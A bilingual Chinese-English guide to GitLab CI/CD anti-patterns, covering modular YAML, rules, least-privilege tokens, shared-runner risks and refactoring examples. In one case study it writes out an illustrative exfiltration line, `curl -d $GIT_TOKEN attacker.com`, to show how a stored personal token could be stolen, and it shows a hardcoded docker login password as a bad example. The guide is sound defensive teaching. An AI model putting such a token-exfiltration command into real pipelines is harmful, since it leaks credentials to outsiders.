# 常見陷阱與反模式 (Anti-patterns) / Common Pitfalls and Anti-patterns

## Mental model｜心智模型

在深入探討 GitLab 的反模式之前，我們必須建立一個核心觀念：**GitLab 不僅僅是一個存放程式碼的倉庫，它是一個自動化工廠，而 `.gitlab-ci.yml` 是這座工廠的藍圖。**

許多團隊在使用 GitLab 時，往往只將其視為 GitHub 的替代品加上一個附屬的 Runner，導致了以下錯誤的心智模型：

1.  **UI First (ClickOps)**：認為設定應該在網頁介面上點選完成（例如 Variable 設定、Branch Protection）。
2.  **Scripting mindset**：把 `.gitlab-ci.yml` 當作一個巨大的 Shell Script 堆砌，忽略了軟體工程中的模組化與可維護性。
3.  **Permission Binary**：認為權限只有「能跑」跟「不能跑」，導致過度開放權限給 Developer 或 CI Job。

**正確的心智模型應該是：**

> **Everything as Code & Pipeline as a Product**
>
> 所有的設定（包含 CI/CD 邏輯、環境變數的定義、基礎設施）都應該盡可能代碼化並進入版本控制。CI 流水線本身就是一個軟體產品，需要被設計、重構、測試與維護。

---

## Patterns & best practices｜常見模式與最佳實務

為了避免技術債，以下是資深工程師在 GitLab 專案中應遵循的模式：

### 1. 模組化與繼承 (Modularity and Inheritance)
不要將所有邏輯寫在單一的 `.gitlab-ci.yml` 中。
- **Use `extends`**: 利用隱藏 job (Hidden Jobs, 以 `.` 開頭) 來定義通用邏輯，讓實際 job 去繼承。
- **Use `include`**: 將不同功能的流水線拆分為多個檔案（例如 `/ci/build.yml`, `/ci/deploy.yml`）。
- **Use `!reference`**: 在 `script` 區塊中重用現有的 script 片段，保持 DRY (Don't Repeat Yourself)。

### 2. 明確的規則控制 (Explicit Rules)
避免「每次 Commit 都跑所有 Job」的資源浪費。
- **`rules: changes`**: 只有當特定目錄下的檔案變更時才執行對應 Job（例如：只有 `/backend` 變更時才跑後端測試）。
- **`workflow: rules`**: 在全域層級定義流水線是否該被建立（例如：避免在 Push 到 MR 時產生兩條重複的 Pipeline）。

### 3. 權限最小化原則 (Least Privilege)
- **Project/Group Access Tokens**: 自動化腳本不應使用個人的 Personal Access Token (PAT)，應使用範圍受限的 Project Token。
- **Protected Variables**: 敏感資料（如 AWS Keys）必須設為 Masked 且 Protected，僅允許在 Protected Branches/Tags 上存取。

### 4. 宣告式環境 (Declarative Environments)
- 使用 GitLab 的 **Environments** 功能來追蹤部署狀態，而不是只在 Console 印出 "Deployed"。這能讓你從 UI 直接看到哪個 Commit 正跑在 Production 上，並支援 Rollback。

---

## Anti-patterns & pitfalls｜反模式與踩雷點

這是本章節的核心，請檢視你的專案是否中了以下招數：

### 1. The "Wall of YAML" (YAML 巨牆)
- **徵兆**：一個 `.gitlab-ci.yml` 檔案超過 500 行，充滿了重複的 `before_script` 和類似的 `script` 邏輯。
- **後果**：沒人敢修改 CI 流程，因為牽一髮動全身，除錯極其困難。
- **解法**：重構為 `include` 結構，並提取共用邏輯到 template。

### 2. The "Phantom Configuration" (幽靈設定 / 過度依賴 UI)
- **徵兆**：流水線依賴大量的 CI/CD Variables 設定在 GitLab UI 中，但 Repo 內沒有任何文件說明需要哪些變數。
- **後果**：當專案需要 Fork 或遷移時，流水線直接炸開；或者當管理員離職後，沒人知道那個變數原本是用來做什麼的。
- **解法**：在 `.gitlab-ci.yml` 中使用預設值，或建立一個 `.env.example` 文件。對於非機密變數，直接寫在 YAML 的 `variables` 區塊中。

### 3. Hardcoded Secrets & Magic Values (硬編碼機密與魔術數字)
- **徵兆**：`script: - docker login -u admin -p SuperSecret123` 直接寫在 YAML 裡。
- **後果**：安全性災難。即使後來刪除了，Git History 裡依然存在。
- **解法**：強制使用 GitLab CI/CD Variables，並配合 Vault 或 Cloud Provider 的 Secret Manager。

### 4. The "God Mode" Runner (上帝模式 Runner)
- **徵兆**：為了方便，讓 Runner 使用 `privileged` 模式，並掛載 `/var/run/docker.sock`，且該 Runner 被所有專案共享。
- **後果**：任何一個惡意 Job 都可以控制整台宿主機，甚至竊取其他專案的程式碼或憑證。
- **解法**：使用 Docker-in-Docker (dind) 的安全實作，或針對敏感專案使用獨立的 Runner (Tagging)。

### 5. Zombie Pipelines (殭屍流水線)
- **徵兆**：修改了 `README.md` 或文件檔，結果觸發了完整的 Build -> Test -> Deploy 流程。
- **後果**：浪費大量的 CI 分鐘數與運算資源，阻塞了真正需要跑的任務。
- **解法**：嚴格設定 `rules` 與 `changes`。

---

## Checklists & workflows｜檢查清單與流程

在進行 Code Review 或專案健檢時，請使用此清單：

### CI/CD Code Review Checklist
- [ ] **DRY Check**: 是否有重複的 script 區塊？能否用 `extends` 或 `!reference` 優化？
- [ ] **Security Check**: YAML 中是否包含明文密碼或 Token？
- [ ] **Performance Check**: 是否針對文件修改 (Documentation changes) 略過了 Build/Test 階段？
- [ ] **Artifacts Check**: `artifacts` 是否設定了合理的 `expire_in`？（避免無限期佔用儲存空間）
- [ ] **Image Check**: Docker image 是否使用了具體的 tag（如 `node:18-alpine`）而不是 `latest`？（避免未來版本更新導致壞掉）

### Project Onboarding Workflow (Decision Tree)
當新專案要接入 GitLab CI 時：
1. **是否需要存取外部資源 (AWS/GCP/K8s)？**
   - 是 → 設定 OIDC (OpenID Connect) 整合，避免使用長效型 Access Key。
   - 否 → 跳過。
2. **是否為 Monorepo？**
   - 是 → 必須使用 `include: local` 拆分各服務的 CI 設定，並搭配 `rules: changes`。
   - 否 → 使用標準模板。
3. **是否有機密變數？**
   - 是 → 在 Settings > CI/CD > Variables 設定，並勾選 "Masked"。

---

## Real-world examples｜實戰案例

### 案例一：從 Spaghetti YAML 到 Modular Design
**Bad Practice (反模式):**
重複定義 `before_script`，且硬編碼環境。

```yaml
# .gitlab-ci.yml
build-dev:
  image: node:16
  stage: build
  before_script:
    - npm install
  script:
    - npm run build:dev

build-prod:
  image: node:16
  stage: build
  before_script:
    - npm install
  script:
    - npm run build:prod
```

**Refactored (最佳實務):**
使用 `extends` 與變數。

```yaml
# .gitlab-ci.yml
.build_template: # Hidden job
  image: node:16
  stage: build
  before_script:
    - npm install
  script:
    - npm run build:$ENV_TARGET

build-dev:
  extends: .build_template
  variables:
    ENV_TARGET: dev
  rules:
    - if: $CI_COMMIT_BRANCH == "develop"

build-prod:
  extends: .build_template
  variables:
    ENV_TARGET: prod
  rules:
    - if: $CI_COMMIT_TAG
```

### 案例二：濫用 UI 變數導致的「幽靈依賴」
**情境**：
開發者 A 在 GitLab UI 設定了一個變數 `API_ENDPOINT` 指向測試站。一年後，開發者 B 接手，發現程式碼裡找不到這個 URL 是哪來的，且 Production 部署後竟然連線到測試站。

**解決方案**：
在 YAML 中明確宣告預設值，UI 僅用於覆蓋（Override）敏感或特定環境的值。

```yaml
variables:
  # 預設值明確寫在 Code 裡，作為 Single Source of Truth
  API_ENDPOINT: "https://api.production.com"

deploy:
  script:
    - echo "Deploying to $API_ENDPOINT"
  # 如果需要在 Staging 環境覆蓋，才去 UI 設定 API_ENDPOINT = https://api.staging.com
```

### 案例三：權限過大的 CI Job
**情境**：
為了讓 CI 能夠自動推 Commit (例如版號更新)，團隊直接把某個 Maintainer 的 Personal Access Token 塞進變數 `GIT_TOKEN`。

**風險**：
任何能修改 `.gitlab-ci.yml` 的人，都可以寫一行 `echo $GIT_TOKEN` 或 `curl -d $GIT_TOKEN attacker.com` 來竊取該 Maintainer 的所有權限（包含其他專案）。

**修正**：
使用 **Project Access Token** 或 **Deploy Key**，並將 Token 權限限制在 `write_repository`，且僅限該專案有效。